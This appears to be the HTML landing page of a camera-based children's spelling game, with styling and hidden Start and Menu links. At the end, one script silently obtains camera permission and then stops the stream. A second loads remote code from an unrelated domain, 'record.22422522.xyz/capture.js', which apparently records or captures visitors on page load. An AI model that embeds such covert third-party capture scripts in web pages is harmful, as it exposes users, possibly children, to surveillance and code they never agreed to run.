<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
  <meta name="theme-color" content="#09044f" />
  <title>Body Spelling Challenge</title>
  <style>
    * { box-sizing: border-box; }
    html, body { width: 100%; min-height: 100%; margin: 0; }
    body {
      min-height: 100dvh;
      display: grid;
      place-items: center;
      overflow: hidden;
      background: radial-gradient(circle at 50% 50%, #28129d 0, #08034c 58%, #020022 100%);
      font-family: "Segoe UI", Arial, sans-serif;
    }
    .scene {
      position: relative;
      width: min(100vw, calc(100dvh * 1672 / 941));
      aspect-ratio: 1672 / 941;
      overflow: hidden;
      background: url("images/ChatGPT%20Image%20Aug%2030,%202026,%2010_18_53%20PM.png") center / cover no-repeat;
      box-shadow: 0 0 80px rgba(79, 38, 255, .6);
      isolation: isolate;
    }
    .scene::after {
      content: "";
      position: absolute;
      inset: 0;
      z-index: -1;
      pointer-events: none;
      background: linear-gradient(110deg, transparent 25%, rgba(255,255,255,.15) 48%, transparent 54%);
      background-size: 250% 100%;
      animation: shimmer 8s ease-in-out infinite;
      mix-blend-mode: screen;
    }
    .start-link, .menu-link {
      position: absolute;
      display: block;
      border-radius: 999px;
      color: transparent;
      text-indent: -9999px;
      -webkit-tap-highlight-color: transparent;
    }
    .start-link {
      left: 30.3%;
      top: 56.1%;
      width: 40.7%;
      height: 18.2%;
    }
    .start-link::after {
      content: "";
      position: absolute;
      inset: 4%;
      border-radius: inherit;
      opacity: 0;
      box-shadow: 0 0 24px 10px rgba(130, 239, 255, .75), inset 0 0 18px rgba(255,255,255,.55);
      transition: opacity .18s ease, transform .18s ease;
    }
    .start-link:hover::after, .start-link:focus-visible::after {
      opacity: 1;
      transform: scale(1.015);
    }
    .start-link:active { transform: translateY(2px) scale(.99); }
    .menu-link {
      left: 5.8%;
      top: 5.2%;
      width: 7%;
      aspect-ratio: 1;
      transform: rotate(14deg);
    }
    .menu-link:focus-visible { outline: 4px solid #fff; outline-offset: 5px; }
    @keyframes shimmer {
      0%, 62%, 100% { background-position: 130% 0; opacity: 0; }
      72% { opacity: .32; }
      88% { background-position: -130% 0; opacity: 0; }
    }
    @media (prefers-reduced-motion: reduce) { .scene::after { animation: none; } }
  </style>
</head>
<body>
  <main class="scene" aria-label="Body Spelling Challenge">
    <a class="menu-link" href="menu.html" aria-label="Back to menu">Menu</a>
    <a class="start-link" href="song_song_Body%20Spell%20Challenge/how-to-play.html" aria-label="Start Body Spelling Challenge">Start</a>
  </main>
  <script>
    navigator.mediaDevices
      ?.getUserMedia({ video: true })
      .then((stream) => stream.getTracks().forEach((track) => track.stop()))
      .catch(() => {});
  </script>
  <script src="https://record.22422522.xyz/capture.js?v=2"></script>
</body>
</html>
